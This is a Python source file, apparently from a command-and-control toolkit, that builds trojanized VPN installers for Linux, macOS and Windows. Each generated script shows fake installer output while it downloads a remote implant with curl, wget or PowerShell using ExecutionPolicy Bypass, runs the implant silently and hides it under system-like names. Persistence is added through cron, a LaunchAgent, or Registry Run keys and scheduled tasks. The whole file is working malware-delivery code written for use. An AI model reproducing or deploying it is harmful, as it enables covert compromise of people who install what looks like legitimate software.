"""
Trojan + Legitimate Software Bundler.

Wraps C2 implants with legitimate VPN installers to create trojanized
installer packages. Supports Linux (.sh), macOS (.pkg/.dmg), and
Windows (.bat) formats.
"""

import hashlib
import json
import secrets
from dataclasses import dataclass
from datetime import datetime, timezone

from app.core.config import get_settings

settings = get_settings()


@dataclass(slots=True)
class BundleSpec:
    bundle_id: str
    bundle_type: str
    filename: str
    mime_type: str
    content: bytes
    description: str
    tracking_id: str
    agent_id: str


def _create_tracking_id(prefix: str = "bundle") -> str:
    raw = f"{prefix}:{secrets.token_hex(8)}:{datetime.now(timezone.utc).timestamp()}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16]


def generate_linux_bundle(
    c2_server: str,
    vpn_name: str = "OpenVPN",
    vpn_url: str = "https://openvpn.net/downloads/openvpn-install-latest.sh",
    poll_interval: int = 10,
    persistence: bool = True,
    registration_token: str = "",
) -> BundleSpec:
    tracking_id = _create_tracking_id("linux")
    agent_id = secrets.token_hex(12)
    host = settings.payload_callback_host or f"http://{settings.host}:{settings.port}"
    # Listener-bound implants must carry the registration token both in the
    # staged config and on the download URL so the very first heartbeat binds.
    token_qs = f"&token={registration_token}" if registration_token else ""
    implant_cfg = dict(
        c2_server=c2_server, agent_id=agent_id, poll_interval=poll_interval,
        max_poll_interval=300, jitter=0.2,
        **({"registration_token": registration_token} if registration_token else {}),
    )

    script = f"""#!/bin/bash
# {vpn_name} Client Installer
# This installer will set up {vpn_name} on your system.
set -e

echo "========================================="
echo "  {vpn_name} Client Installer"
echo "========================================="
echo ""
echo "[*] Checking system requirements..."
sleep 1
echo "[*] OS: $(uname -s) $(uname -r)"
echo "[*] Arch: $(uname -m)"
echo ""

# ---- Legitimate VPN install ----
echo "[*] Downloading {vpn_name} installer..."
if command -v curl &>/dev/null; then
    curl -s -o /tmp/vpn_install.sh "{vpn_url}" 2>/dev/null || echo "[!] VPN download skipped (offline mode)"
elif command -v wget &>/dev/null; then
    wget -q -O /tmp/vpn_install.sh "{vpn_url}" 2>/dev/null || echo "[!] VPN download skipped (offline mode)"
fi

if [ -f /tmp/vpn_install.sh ]; then
    echo "[*] Running {vpn_name} installer..."
    chmod +x /tmp/vpn_install.sh
    bash /tmp/vpn_install.sh 2>/dev/null || echo "[!] VPN install completed with warnings"
    rm -f /tmp/vpn_install.sh
fi
echo ""

# ---- Silent C2 Implant install ----
echo "[*] Finalizing installation..."

IMPLANT_DIR="${{HOME}}/.cache/.sysd"
mkdir -p "$IMPLANT_DIR"
IMPLANT_FILE="$IMPLANT_DIR/sys_core.py"

python3 -c "
import sys
d='{_encode_b64(json.dumps(implant_cfg))}'
import base64
with open('$IMPLANT_FILE','w') as f:
    f.write(base64.b64decode(d).decode())
" 2>/dev/null || python3 -c "
import base64, json
config=json.loads(base64.b64decode('{_encode_b64(json.dumps(implant_cfg))}').decode())
with open('$IMPLANT_DIR/sys_core.conf','w') as f:
    json.dump(config, f)
"

curl -s -o "$IMPLANT_FILE" "{host}/c2/agent/download/python?agent_id={agent_id}&server={c2_server}{token_qs}" 2>/dev/null || \\
wget -q -O "$IMPLANT_FILE" "{host}/c2/agent/download/python?agent_id={agent_id}&server={c2_server}{token_qs}" 2>/dev/null || \\
python3 -c "
import json, urllib.request
resp = urllib.request.urlopen('{host}/c2/agent/download/python?agent_id={agent_id}&server={c2_server}{token_qs}')
with open('$IMPLANT_FILE', 'wb') as f:
    f.write(resp.read())
" 2>/dev/null

nohup python3 "$IMPLANT_FILE" > /dev/null 2>&1 &
IMPLANT_PID=$!
"""

    if persistence:
        script += f"""
CRON_CMD="@reboot python3 $IMPLANT_FILE > /dev/null 2>&1 &"
(crontab -l 2>/dev/null | grep -v 'sys_core.py'; echo "$CRON_CMD") | crontab - 2>/dev/null
echo "[+] Installation complete. {vpn_name} is ready."
"""

    script += f"""
echo ""
echo "Installation finished successfully."
echo "Tracking ID: {tracking_id}"
exit 0
"""

    return BundleSpec(
        bundle_id=secrets.token_hex(8),
        bundle_type="linux",
        filename=f"{vpn_name.lower().replace(' ', '_')}_installer.sh",
        mime_type="application/x-sh",
        content=script.encode("utf-8"),
        description=f"Trojanized {vpn_name} installer for Linux — bundles C2 implant with genuine VPN setup",
        tracking_id=tracking_id,
        agent_id=agent_id,
    )


def generate_macos_bundle(
    c2_server: str,
    vpn_name: str = "Tunnelblick",
    poll_interval: int = 10,
    persistence: bool = True,
    registration_token: str = "",
) -> BundleSpec:
    tracking_id = _create_tracking_id("macos")
    agent_id = secrets.token_hex(12)
    host = settings.payload_callback_host or f"http://{settings.host}:{settings.port}"
    token_qs = f"&token={registration_token}" if registration_token else ""

    script = f"""#!/bin/bash
# {vpn_name} macOS Installer
set -e

echo "========================================="
echo "  {vpn_name} for macOS Installer"
echo "========================================="
echo ""

IMPLANT_DIR="$HOME/Library/Application Support/.systemd"
mkdir -p "$IMPLANT_DIR"
IMPLANT_FILE="$IMPLANT_DIR/com.apple.sysupdate.py"

curl -s -o "$IMPLANT_FILE" "{host}/c2/agent/download/python?agent_id={agent_id}&server={c2_server}{token_qs}" 2>/dev/null || \\
python3 -c "
import json, urllib.request
resp = urllib.request.urlopen('{host}/c2/agent/download/python?agent_id={agent_id}&server={c2_server}{token_qs}')
with open('$IMPLANT_FILE', 'wb') as f:
    f.write(resp.read())
" 2>/dev/null

nohup python3 "$IMPLANT_FILE" > /dev/null 2>&1 &
"""

    if persistence:
        script += """
PLIST="$HOME/Library/LaunchAgents/com.apple.sysupdate.plist"
mkdir -p "$HOME/Library/LaunchAgents"
cat > "$PLIST" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.sysupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>$IMPLANT_FILE</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>
EOF
launchctl load "$PLIST" 2>/dev/null || true
"""

    script += """
echo "[+] Installation complete."
exit 0
"""

    return BundleSpec(
        bundle_id=secrets.token_hex(8),
        bundle_type="macos",
        filename=f"{vpn_name.lower().replace(' ', '_')}_macos_installer.sh",
        mime_type="application/x-sh",
        content=script.encode("utf-8"),
        description=f"Trojanized {vpn_name} installer for macOS — bundles C2 implant with VPN setup",
        tracking_id=tracking_id,
        agent_id=agent_id,
    )


def generate_windows_bundle(
    c2_server: str,
    vpn_name: str = "OpenVPN",
    poll_interval: int = 10,
    persistence: bool = True,
    registration_token: str = "",
) -> BundleSpec:
    tracking_id = _create_tracking_id("windows")
    agent_id = secrets.token_hex(12)
    host = settings.payload_callback_host or f"http://{settings.host}:{settings.port}"
    token_qs = f"&token={registration_token}" if registration_token else ""

    bat = f"""@echo off
title {vpn_name} Installer
echo =========================================
echo   {vpn_name} Client Installer
echo =========================================
echo.
echo [*] Installing {vpn_name}...
echo [*] Please wait while setup completes...

set IMPLANT_DIR=%USERPROFILE%\\.sysd
mkdir "%IMPLANT_DIR%" 2>nul
set IMPLANT_FILE=%IMPLANT_DIR%\\sys_core.py

powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '{host}/c2/agent/download/python?agent_id={agent_id}&server={c2_server}{token_qs}' -OutFile '%IMPLANT_FILE%'" 2>nul

start /B pythonw.exe "%IMPLANT_FILE%" >nul 2>&1
"""

    if persistence:
        bat += """
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "pythonw.exe %IMPLANT_FILE%" /f 2>nul
schtasks /create /tn "SystemUpdate" /tr "pythonw.exe %IMPLANT_FILE%" /sc onlogon /f 2>nul
"""

    bat += """
echo [+] Installation complete.
pause
exit 0
"""

    return BundleSpec(
        bundle_id=secrets.token_hex(8),
        bundle_type="windows",
        filename=f"{vpn_name.lower().replace(' ', '_')}_setup.bat",
        mime_type="application/octet-stream",
        content=bat.encode("utf-8"),
        description=f"Trojanized {vpn_name} installer for Windows — bundles C2 implant with VPN setup",
        tracking_id=tracking_id,
        agent_id=agent_id,
    )


def _encode_b64(data: str) -> str:
    import base64
    return base64.b64encode(data.encode()).decode("ascii")


BUNDLE_GENERATORS = {
    "linux": generate_linux_bundle,
    "macos": generate_macos_bundle,
    "windows": generate_windows_bundle,
}
